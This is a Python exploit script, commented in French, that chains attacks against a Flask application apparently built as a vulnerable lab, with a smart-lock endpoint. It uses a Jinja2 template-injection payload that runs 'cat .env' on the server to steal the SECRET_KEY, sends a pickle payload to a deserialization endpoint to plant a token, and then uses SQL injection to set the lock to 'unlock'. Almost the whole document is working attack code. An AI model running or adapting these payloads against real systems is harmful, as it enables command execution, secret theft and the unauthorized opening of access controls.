#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import pickle
import time
import re

# Adresse de l'application Flask (modifiez selon votre IP/port)
BASE_URL = "http://192.168.1.117:5000"

def step1_jinja_template_injection():
    """
    Exploite la faille Jinja2 pour lire le fichier .env
    Retourne le SECRET_KEY (extrait du contenu).
    """
    # Payload Jinja2 pour lire .env
    payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat .env').read() }}"
    url = f"{BASE_URL}/vuln/template?q={payload}"

    print("[*] Étape 1 : Jinja2 Template Injection pour lire .env")
    r = requests.get(url)
    if r.status_code == 200:
        print("[+] Contenu du fichier .env :")
        print(r.text)

        # Essayer d'extraire SECRET_KEY via une regex (ex: SECRET_KEY=xxx)
        match = re.search(r"SECRET_KEY\s*=\s*([^\n\r]+)", r.text)
        if match:
            secret_key = match.group(1).strip()
            print(f"[+] SECRET_KEY détecté : {secret_key}")
            return secret_key
        else:
            print("[-] Impossible de trouver SECRET_KEY dans .env")
            return None
    else:
        print(f"[-] Échec de la requête : code {r.status_code}")
        return None


def step2_pickle_deserialize(malicious_token):
    """
    Exploite la faille de désérialisation (Pickle) pour définir OVERRIDE_TOKEN
    """
    print("[*] Étape 2 : Désérialisation Pickle pour forcer OVERRIDE_TOKEN")

    # On prépare un objet pickle contenant { "set_token": malicious_token }
    payload = pickle.dumps({"set_token": malicious_token})

    url = f"{BASE_URL}/vuln/deserialize"
    r = requests.post(url, data=payload)
    if r.status_code == 200:
        print("[+] Réponse de /vuln/deserialize :", r.text)
    else:
        print(f"[-] Échec de la requête /vuln/deserialize : code {r.status_code}, {r.text}")


def step3_injection_sql(malicious_token):
    """
    Exploite la faille d'injection SQL pour passer la serrure à 'unlock' (avec injection).
    """
    print("[*] Étape 3 : Injection SQL pour modifier l'état de la serrure")

    # Paramètre "update" contenant l'injection (ex: "unlock';--")
    # On encode l'apostrophe pour éviter un problème de shell
    update_value = "unlock'%20--%20"
    url = f"{BASE_URL}/vuln/serrure?token={malicious_token}&update={update_value}"

    r = requests.post(url)
    if r.status_code == 200:
        print("[+] Réponse de /vuln/serrure :", r.text)
    else:
        print(f"[-] Échec de la requête /vuln/serrure : code {r.status_code}, {r.text}")


def main():
    # 1. Récupération du SECRET_KEY via la faille Jinja2
    secret_key = step1_jinja_template_injection()
    if not secret_key:
        print("[-] Impossible de poursuivre sans SECRET_KEY.")
        return

    # 2. Exploitation de la désérialisation Pickle
    #    On choisit un token malicieux. Il peut être identique au SECRET_KEY ou arbitraire.
    malicious_token = "070fd4aed23c3a8e43330466177bd99ee0146466b221cab5e612f42a0efa69f0"
    step2_pickle_deserialize(malicious_token)

    # 3. Injection SQL pour mettre la serrure en mode "unlock"
    step3_injection_sql(malicious_token)

    print("[*] Les vulnérabilités ont été exploitées.")
    print("[*] Si un reset auto est configuré, il devrait survenir dans ~10s.")


if __name__ == "__main__":
    main()
